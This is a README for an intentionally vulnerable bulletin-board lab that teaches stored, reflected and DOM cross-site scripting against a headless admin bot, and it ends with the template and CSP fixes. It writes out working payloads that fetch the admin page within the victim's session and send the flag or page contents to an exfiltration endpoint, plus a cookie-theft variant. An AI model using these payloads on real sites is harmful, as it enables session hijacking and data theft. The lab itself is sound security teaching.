# MiniBoard — Realistic XSS Lab

⚠️ Intentionally vulnerable. Run on **localhost only**. Never expose to the internet.

A small bulletin board with real auth, a real admin panel, and a headless
admin bot that visits reported URLs — the same mechanism used by HackerOne
programs and PortSwigger Academy.

## Run

```bash
docker compose up --build
```

Open **http://127.0.0.1:5000**

Seed users:

| user | pass | role |
|---|---|---|
| admin | admin | admin (has the flag) |
| alice | alice | regular user |
| bob   | bob   | regular user |

## The attack chain

1. Log in as **alice**.
2. Post something with a payload (see below).
3. Submit the URL to `/report`.
4. Wait ~15 seconds.
5. Open **`/exfil/log`** — the flag is there.
6. (Bonus) Log in as **admin/admin** to compare.

The admin bot logs in as `admin`, visits the reported URL, and waits 5 s.
Any JS in that page runs **in the admin's authenticated session**.

## Payloads

### Stored XSS (post body)

Submit a post with this body:

```html
<script>
fetch('/admin').then(r=>r.text()).then(t=>{
  const m = t.match(/FLAG\{[^}]+\}/);
  if (m) fetch('/exfil?data=' + encodeURIComponent(m[0]));
});
</script>
```

Report `http://127.0.0.1:5000/posts/<id>` → the bot loads the post → the script runs in the admin session → the flag is posted to `/exfil`.

### Reflected XSS (search query)

Report this URL:

```
http://127.0.0.1:5000/search?q=<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('/exfil?data='+encodeURIComponent(t)))</script>
```

The bot visits the search URL → the query is rendered raw → the script fires.

### DOM XSS (message hash)

Report this URL:

```
http://127.0.0.1:5000/messages#<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>fetch('/exfil?data='+encodeURIComponent(t)))">
```

The fragment never reaches the server. The bot's browser reads `location.hash`
and writes it into `innerHTML` — the `onerror` handler runs in the admin session.

### The "why isn't document.cookie enough?" moment

The session cookie is `HttpOnly`, so this payload **won't** leak the cookie:

```
/messages#<img src=x onerror="fetch('/exfil?data='+document.cookie)">
```

It will post `""` to `/exfil`. This is the whole point of HttpOnly.

But the **fetch-based payload above still works**, because `fetch('/admin')`
is same-origin and the browser attaches the cookie automatically.
**XSS is a session problem, not a cookie problem.**

## The fix (what a real app does)

| Location | Vulnerable | Fixed |
|---|---|---|
| `templates/post.html` | `{{ post['body'] \| safe }}` | `{{ post['body'] }}` (Jinja auto-escape) |
| `templates/search.html` | `{{ q \| safe }}` | `{{ q }}` |
| `templates/messages.html` | `el.innerHTML = msg` | `el.textContent = msg` |

Additionally: ship a strict Content-Security-Policy that disallows `unsafe-inline`,
so even a missed sink can't run arbitrary script.

## Run without Docker

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
playwright install chromium
python app.py
```